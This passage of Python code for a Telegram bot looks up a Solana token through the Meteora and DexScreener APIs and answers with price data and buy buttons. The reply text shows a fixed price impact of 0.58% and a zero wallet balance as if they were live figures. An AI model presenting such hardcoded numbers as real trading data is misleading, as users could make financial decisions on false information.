            f"https://dlmm-api.meteora.ag/pair/{message.split('meteora.ag/dlmm/')[1]}",
            headers={},
        ).json()
        contract = data['mint_x']
    elif " " not in message:
        data = get_dexscreener_contract(message)
        is_dex = True
        contract_data = data
        contract = data['baseToken']['address']
    else:
        return
    if not is_dex:
        contract_data = get_dexscreener_contract(contract)
    print('contract', contract_data)
    prices = contract_data['priceChange']
    print(prices)
    message = f"""
{contract_data['baseToken']['name']} | *{contract_data['baseToken']['symbol']}* | {contract_data['baseToken']['address']}

Price: $*{contract_data['priceUsd']}*
5m: *{prices['m5']}%*, 1h: *{prices['h1']}%*, 6h: *{prices['h6']}%*, 24h: *{prices['h24']}%*
Market Cap: $*{contract_data['marketCap']}*

Price Impact (5.0000 SOL): *0.58%*

Wallet Balance: *0.0000 SOL*
    """
    keyboard = [
        [InlineKeyboardButton("Cancel", callback_data="continue")],
        [InlineKeyboardButton("Explorer", url=f"https://solscan.io/account/{contract_data['baseToken']['address']}"), InlineKeyboardButton("Chart", url=f"{contract_data['url']}")],
        [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_1_0_{contract_data['baseToken']['address']}"), InlineKeyboardButton("Buy 5.0 SOL", callback_data="buy_5_0"), InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x_{contract_data['baseToken']['address']}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=update.message.chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)

    # Opcional: Logear el mensaje en la consola o guardarlo en la base de datos
    #print(f"Mensaje de {user_id}: {user_message}")

# Configurar el bot
def main() -> None:
    # Crear la aplicaciÃ³n del bot
    application = Application.builder().token(TOKEN).build()

    # Agregar el manejador del comando /start
    application.add_handler(CommandHandler("start", start))

    # Agregar el manejador del botÃ³n
    application.add_handler(CallbackQueryHandler(button_handler))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Iniciar el bot
    application.run_polling()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # Ejecutar la funciÃ³n asincrÃ³nica en el nuevo bucle
    loop.run_until_complete(check_balances())
    #loop.close()
    main()
#conexion.close()
